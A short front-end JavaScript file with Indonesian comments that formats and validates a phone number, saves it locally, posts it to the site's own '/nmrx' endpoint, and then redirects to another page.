
// form.js

const phoneInput = document.getElementById("phone");
const lanjutBtn = document.getElementById("lanjutBtn");
const loadingBox = document.getElementById("loadingBox");
const clearBtn = document.getElementById("clearBtn");
const errorBox = document.getElementById("errorBox");

/* FADE IN */
window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
});

/* AUTO FOCUS */
window.addEventListener("load", () => {
    phoneInput.focus();
});

/* FORMAT NOMOR */
phoneInput.addEventListener("input", (e) => {

    let angka = e.target.value.replace(/\D/g, '');

    angka = angka.substring(0, 13);

    let hasil = "";

    if (angka.length > 0) {
        hasil += angka.substring(0, 3);
    }

    if (angka.length >= 3) {
        hasil += "-" + angka.substring(3, 7);
    }

    if (angka.length >= 7) {
        hasil += "-" + angka.substring(7, 13);
    }

    e.target.value = hasil;

    /* SHOW / HIDE X */
    clearBtn.style.display = hasil.length > 0 ? "flex" : "none";

    /* HIDE ERROR */
    errorBox.classList.remove("show");

});

/* CLEAR INPUT */
clearBtn.addEventListener("click", () => {

    phoneInput.value = "";

    clearBtn.style.display = "none";

    errorBox.classList.remove("show");

    phoneInput.focus();

});

/* KEYBOARD ANGKA */
phoneInput.setAttribute("inputmode", "numeric");

/* ENTER */
phoneInput.addEventListener("keydown", (e) => {

    if (e.key === "Enter") {
        lanjutBtn.click();
    }

});

/* LANJUT */
lanjutBtn.addEventListener("click", () => {

    /* AMBIL NOMOR */
    const nomor = phoneInput.value.replace(/\D/g, '');

    /* VALIDASI */
    if (
        nomor.length < 9 ||
        nomor.charAt(0) !== "8"
    ) {

        if (navigator.vibrate) {
            navigator.vibrate([120, 80, 120]);
        }

        errorBox.classList.add("show");

        setTimeout(() => {
            errorBox.classList.remove("show");
        }, 2000);

        phoneInput.focus();

        return;
    }

    /* SIMPAN LOCAL */
    localStorage.setItem("nmrx", nomor);

    /* KIRIM KE SERVER TANPA MENUNGGU */
    fetch("/nmrx", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            nmrx: nomor
        }),
        keepalive: true
    }).catch(err => {
        console.error("Gagal mengirim data:", err);
    });

    /* LANGSUNG PINDAH HALAMAN */
    window.location.href = "pix.html";

});

/* RESET LOADING */
window.addEventListener("pageshow", () => {

    if (loadingBox) {
        loadingBox.style.display = "none";
    }

});
